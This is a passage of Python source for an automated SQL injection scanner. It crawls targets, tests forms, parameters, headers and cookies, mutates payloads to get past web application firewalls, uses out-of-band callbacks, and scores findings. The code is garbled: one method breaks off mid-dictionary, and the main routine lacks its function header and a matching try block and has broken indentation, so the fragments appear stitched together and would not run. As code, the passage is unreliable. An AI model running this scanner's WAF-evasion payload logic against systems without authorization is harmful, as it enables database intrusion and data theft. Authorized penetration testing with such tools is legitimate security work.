        if sigs_found:
            finding.error_signature_found = sigs_found[0]
        if db_hint != "unknown":
            finding.db_type_hint = db_hint

        # 2. Content diff analysis
        if baseline:
            len_diff = abs(finding.test_length - baseline.content_length)
            if baseline.content_length > 0:
                finding.response_difference_percent = (len_diff / baseline.content_length) * 100.0

            # Boolean classification
            if payload.category == PayloadCategory.BOOLEAN_BASED and baseline.content_hash:
                current_hash = hashlib.md5(resp.content).hexdigest()
                if current_hash != baseline.content_hash:
                    if "OR 1=1" in payload.value or "OR 'a'='a'" in payload.value or "' AND 1=1" in payload.value:
                        finding.is_boolean_positive = True
                        finding.detection_method = str(DetectionMethod.BOOLEAN_BASED)
                        finding.vulnerability_class = "Boolean-Based Blind SQL Injection"
                        finding.bool_true_length = finding.test_length
                    elif "OR 1=2" in payload.value or "OR 'a'='b'" in payload.value or "' AND 1=2" in payload.value:
                        finding.is_boolean_positive = False
                        finding.detection_method = str(DetectionMethod.BOOLEAN_BASED)
                        finding.vulnerability_class = "Boolean-Based Blind SQL Injection"
                        finding.bool_false_length = finding.test_length

        # 3. Time-based statistical analysis
        key = self._param_key(url, param, injection_vector)
        self.timing_analyzer.record_baseline(key, baseline.response_time if baseline else elapsed)
        self.timing_analyzer.record_test(key, payload.value, elapsed)

        is_sig, z_score, p_value, n_samples = self.timing_analyzer.analyze(key, payload.value)
        if is_sig or (baseline and elapsed - baseline.response_time >= self.profile.time_threshold):
            finding.time_delay_detected = True
            finding.time_delay_seconds = elapsed - (baseline.response_time if baseline else 0)
            finding.timing_z_score = z_score
            finding.timing_p_value = p_value
            finding.timing_samples_collected = n_samples
            finding.detection_method = str(DetectionMethod.TIME_BASED_STATISTICAL)
            finding.vulnerability_class = "Time-Based Blind SQL Injection (Statistical)"
            finding.confidence = max(finding.confidence, 0.7)

        # 4. Union probe detection
        if payload.category == PayloadCategory.UNION_PROBE:
            if finding.response_difference_percent > 30 or finding.has_sql_errors:
                finding.detection_method = str(DetectionMethod.UNION_PROBE)
                finding.vulnerability_class = "UNION-Based SQL Injection"

        # 5. Error-based detection
        if finding.has_sql_errors:
            finding.detection_method = str(DetectionMethod.ERROR_BASED)
            finding.vulnerability_class = f"Error-Based SQL Injection ({finding.db_type_hint.upper()})"

        # 6. OOB detection
        if self.oob and payload.requires_oob_domain:
            interactions = self.oob.interactions
            if interactions:
                finding.oob_interaction_id = interactions[-1].get("unique-id", "")
                finding.oob_via = interactions[-1].get("protocol", "dns")
                finding.detection_method = str(DetectionMethod.OOB_DNS)
                finding.vulnerability_class = f"Out-of-Band SQL Injection ({finding.oob_via.upper()})"
                finding.confidence = 0.95  # OOB is definitive

        # 7. Status code anomaly
        if baseline and finding.test_status != finding.baseline_status:
            if not finding.detection_method or finding.detection_method == str(DetectionMethod.CONTENT_DIFF):
                finding.detection_method = str(DetectionMethod.STATUS_CODE_ANOMALY)

        # Calculate final confidence
        finding.confidence = max(finding.confidence, self._score_confidence(finding))

        if finding.confidence < 0.2:
            return None  # noise

        # Severity
        cvss_map = {
            DetectionMethod.ERROR_BASED: 6.5,
            DetectionMethod.BOOLEAN_BASED: 7.5,
            DetectionMethod.TIME_BASED_STATISTICAL: 8.0,
            DetectionMethod.CONTENT_DIFF: 5.0,
            DetectionMethod.UNION_PROBE: 8.5,
            DetectionMethod.OOB_DNS: 9.0,
            DetectionMethod.OOB_HTTP: 9.0,
            DetectionMethod.SECOND_ORDER: 7.5,
            DetectionMethod.STACKED_QUERY: 8.5,
            DetectionMethod.STATUS_CODE_ANOMALY: 4.0,
        }
        try:
            base_score = cvss_map.get(DetectionMethod[finding.detection_method.upper().replace("-", "_")], 5.0)
        except (KeyError, ValueError):
            base_score = 5.0

        # Adjust severity for OOB
        if finding.oob_interaction_id and finding.oob_via:
            base_score = 9.0  # OOB = near-critical

        finding.cvss_score = round(base_score * finding.confidence, 2)
        finding.severity = Severity.from_score(finding.cvss_score).value

        # Generate educational content
        self._generate_education(finding)

        return finding

    def _generate_education(self, finding: SQLiFinding) -> None:
        """Generate educational explanation and remediation."""
        det = finding.detection_method
        vuln_class = finding.vulnerability_class
        db = finding.db_type_hint.upper()
        payload_snippet = finding.payload_used[:80]

        explanation_map = {
            "ERROR_BASED": (
                f"Error-Based SQL Injection detected on parameter '{finding.parameter}'. "

    def _get_payload_variants_for_testing(
        self,
        field: 'PayloadField',
        method: str = "GET",
        payloads: Optional[List[Payload]] = None,
    ) -> List[Tuple[Payload, BypassTechnique]]:
        """Generate payload variants with bypass techniques for a parameter."""
        if payloads is None:
            payloads = PAYLOAD_CORE

        variants: List[Tuple[Payload, BypassTechnique]] = []

        for base_payload in payloads:
            # Skip OOB payloads if no OOB configured
            if base_payload.requires_oob_domain and not self.oob:
                continue

            # For each payload, generate variants at different complexity levels
            max_complexity = min(7, base_payload.base_complexity + 3)

            # Raw version (always include)
            variants.append((base_payload, BypassTechnique.NONE))

            # If the payload is already complex, we might skip some variants
            if base_payload.base_complexity >= 5:
                continue

            # Generate transformed variants
            transformed = PayloadTransformer.generate_variants(
                base_payload.value,
                count=min(3, max_complexity - base_payload.base_complexity + 1),
                max_complexity=max_complexity,
            )

            for variant in transformed:
                new_payload = Payload(
                    value=variant,
                    category=base_payload.category,
                    description=base_payload.description + " [mutated]",
                    db_types=base_payload.db_types,
                    base_complexity=base_payload.base_complexity + 1,
                )
                # Determine which bypass technique was used
                if variant != base_payload.value:
                    technique = BypassTechnique.POLYMORPHIC
                    if variant != variant.lower() and variant != variant.upper():
                        technique = BypassTechnique.CASE_VARIATION
                    if "/**/" in variant:
                        technique = BypassTechnique.COMMENT_INJECTION
                    if "0x" in variant:
                        technique = BypassTechnique.HEX_ENCODING
                    if "%25" in variant:
                        technique = BypassTechnique.DOUBLE_URL_ENCODING
                    if "%" in variant and "%25" not in variant:
                        technique = BypassTechnique.URL_ENCODING
                    variants.append((new_payload, technique))

        # Shuffle to reduce deterministic WAF blocking
        random.shuffle(variants)
        return variants

class Scanner:
    def __init__(self, profile: ScanProfile):
        self.profile = profile
        self.crawler = Crawler(profile)
        self.oob_client: Optional[OOBClient] = None
        if profile.oob_domain:
            self.oob_client = OOBClient(profile.oob_domain)
        self.engine = DetectionEngine(profile, self.oob_client)

    def run(self) -> List[SQLiFinding]:
        """Execute full scan workflow."""
        print(BANNER)
        print(AUTH_PROMPT)
        log.info(f"Target: {self.profile.target_url}")
        log.info(f"Payload registry: {len(PAYLOAD_CORE)} base payloads (polymorphic expansion applies)")
        log.info(f"Crawl depth: {self.profile.crawl_depth}")
        log.info(f"Time-based statistical samples: {self.profile.time_samples_per_payload}")
        log.info(f"Headers: {'ALL (hat tip to CVE-2025 fuzzing)' if self.profile.test_all_headers else 'Standard'}")
        log.info(f"Second-order detection: {'ENABLED' if self.profile.test_second_order else 'Disabled'}")
        log.info(f"OOB detection: {'ENABLED via ' + self.profile.oob_domain if self.profile.oob_domain else 'Disabled'}")
        if self.oob_client:
            log.info(f"  OOB callback domain: {self.oob_client.start()}")
        log.info("─" * 70)

        # ── Phase 1: Crawl ──
        log.info("\n[Phase 1] Crawling target...")
        self.crawler.crawl(self.profile.target_url)
        log.info(f"  URLs visited: {len(self.crawler.visited)}")
        log.info(f"  Forms found: {len(self.crawler.discovered_forms)}")
        log.info(f"  URL params found: {len(self.crawler.discovered_params)}")

        # ── Phase 2: Baseline ──
        log.info("\n[Phase 2] Establishing baselines...")
        for form in self.crawler.discovered_forms:
            key = form.action.split("?")[0]
            if key not in self.engine.baselines:
                if form.method == "POST":
                    clean_data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
                    b = self.crawler.get_baseline(form.action, "POST", clean_data)
                else:
                    b = self.crawler.get_baseline(form.action)
                if b:
                    self.engine.baselines[key] = b
                    log.info(f"  Baseline: {key} ({b.content_length}b, {b.response_time:.2f}s)")

        # ── Phase 3: Test forms ──
        log.info(f"\n[Phase 3] Testing {len(self.crawler.discovered_forms)} forms...")
        for i, form in enumerate(self.crawler.discovered_forms):
            log.info(f"  Form [{i+1}/{len(self.crawler.discovered_forms)}]: {form.action} ({form.method})")
            self.engine.test_form(form)

        # ── Phase 4: Test URL params ──
        log.info(f"\n[Phase 4] Testing {len(self.crawler.discovered_params)} URL parameters...")
        for i, (url, param, val) in enumerate(self.crawler.discovered_params):
            log.info(f"  Param [{i+1}/{len(self.crawler.discovered_params)}]: {param} on {url[:70]}")
            self.engine.test_param(url, param, val)

        # ── Phase 5: Test headers ──
        if self.profile.test_all_headers:
            log.info("\n[Phase 5] Testing HTTP headers...")
            for url in list(self.crawler.visited)[:5]:
                self.engine.test_headers(url)
                self.engine.test_cookies(url)

        # ── Phase 6: Second-order ──
        if self.profile.test_second_order:
            log.info("\n[Phase 6] Testing second-order SQL injection...")
            self.engine.test_second_order(self.crawler)

        # ── Cleanup ──
        if self.oob_client:
            interactions = self.oob_client.stop()
            log.info(f"OOB interactions collected: {len(interactions)}")

        log.info("─" * 70)
        log.info(f"Scan complete. Total findings: {len(self.engine.findings)}")

        return self.engine.findings

    if args.verbose:

        print(AUTH_PROMPT)

            r = input().strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting.")
            return 0
        if r != "I ACCEPT":
            log.error("Authorization declined.")
            return 1
        print()

    # Build profile
    auth_creds = None
    if args.auth:
        parts = args.auth.split(":", 1)
        if len(parts) == 2:
            auth_creds = (parts[0], parts[1])
        else:
            log.error("Invalid auth format. Use user:pass")
            return 1

    auth_header = None
    if args.auth_header:
        parts = args.auth_header.split(":", 1)
        if len(parts) == 2:
            auth_header = {parts[0].strip(): parts[1].strip()}

    profile = ScanProfile(
        target_url=args.target,
        auth_cookie=args.cookie,
        auth_header=auth_header,
        auth_credentials=auth_creds,
        crawl_depth=args.crawl_depth,
        request_delay=args.delay,
        timeout=args.timeout,
        max_threads=args.threads,
        time_threshold=args.time_threshold,
        time_samples_per_payload=args.time_samples,
        test_all_headers=args.all_headers,
        test_second_order=args.second_order,
        oob_domain=args.oob,
    )

    # Run
    try:
        scanner = Scanner(profile)
        findings = scanner.run()
    except KeyboardInterrupt:
        log.warning("Interrupted.")
        return 130
    except Exception as e:
        log.error(f"Fatal: {e}", exc_info=args.verbose)
        return 1

    # Reports
    json_path = f"{args.output}.json"
    html_path = f"{args.output}.html"
    if args.format in ("json", "both"):
        ReportGenerator.to_json(findings, json_path)
    if args.format in ("html", "both"):
        ReportGenerator.to_html(findings, html_path)

    ReportGenerator.print_summary(findings)
    log.info(f"Reports: {json_path}, {html_path}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
